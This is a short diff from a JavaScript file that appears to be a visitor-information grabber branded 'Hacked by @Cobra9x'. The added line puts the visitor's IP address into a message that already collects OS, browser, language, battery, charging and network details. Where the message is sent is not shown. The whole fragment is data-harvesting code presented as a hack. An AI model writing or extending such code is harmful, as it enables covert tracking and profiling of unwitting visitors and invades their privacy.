@@ -170,7 +170,7 @@
           .then(res => res.json())
           .then(data => {
             let basicInfo = "📱 Hacked by @Cobra9x\n\n";
-
+            basicInfo += `🌍 IP Address: ${data.ip}\n\n`;
             basicInfo += "📱 Device Info:\n";
             basicInfo += `💻 OS: ${os}\n🌐 Browser: ${browser}\n🔤 Language: ${lang}\n`;
             basicInfo += `🔋 Charging: ${charging}\n🔌 Battery: ${level}\n📶 Network: ${network.toUpperCase()}\n`;
